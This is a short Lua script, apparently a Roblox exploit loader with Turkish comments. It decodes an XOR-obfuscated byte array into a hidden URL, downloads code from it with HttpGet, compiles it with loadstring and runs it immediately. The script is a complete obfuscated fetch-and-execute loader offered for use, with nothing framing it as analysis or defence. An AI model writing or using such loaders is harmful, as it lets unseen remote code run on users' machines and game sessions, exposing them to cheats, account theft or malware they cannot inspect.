local _S = string; local _T = table; local _G = game;

-- [ ŞİFRELENMİŞ VERİ ] --
local _D = {102, 112, 111, 106, 110, 46, 35, 35, 100, 102, 112, 114, 43, 101, 103, 115, 103, 117, 98, 118, 117, 104, 118, 104, 117, 118, 126, 112, 123, 131, 63, 118, 132, 132, 72, 82, 112, 128, 151, 140, 153, 136, 154, 89, 95, 99, 145, 104, 153, 154, 153, 159, 162, 118, 166, 115, 169, 173, 178, 178, 175, 183, 173, 187, 177, 180, 187, 189, 188, 190, 191, 194, 149, 149, 152, 205, 153, 222, 207, 231, 160, 213, 166, 240, 218, 219, 222, 226, 229, 177, 179, 230, 253, 249, 248, 252}

-- [ HIZLANDIRILMIŞ DEŞİFRELEME ] --
local function _XOR_SOLVE(_DATA)
    local _R = {} -- String birleştirme yerine tablo kullanarak hızlandırdık
    for i = 1, #_DATA do
        local _K = (i % 5) + 8 
        _R[i] = _S.char(bit32.bxor(_DATA[i] - _K, 0x05))
    end
    return _T.concat(_R)
end

local _P = {
    ["\104\116\116\112"] = function(u) return _G:HttpGet(u, true) end,
    ["\101\120\101"] = loadstring
}

local function _START()
    -- Linki hemen çöz
    local _u = _XOR_SOLVE(_D)
    
    -- HTTP isteğini asenkron olmayan ama en hızlı şekilde yap
    -- task.spawn içinde değil, direkt akışta çağırıyoruz ki bekleme yapmasın
    local _ok, _res = pcall(_P["\104\116\116\112"], _u)
    
    if _ok and _res and #_res > 10 then
        local _f = _P["\101\120\101"](_res)
        if _f then 
            -- GUI'nin anında gelmesi için spawn kullanıyoruz
            task.spawn(_f) 
        end
    end
end

-- Gereksiz bypassları ve beklemeleri temizledik
_START()
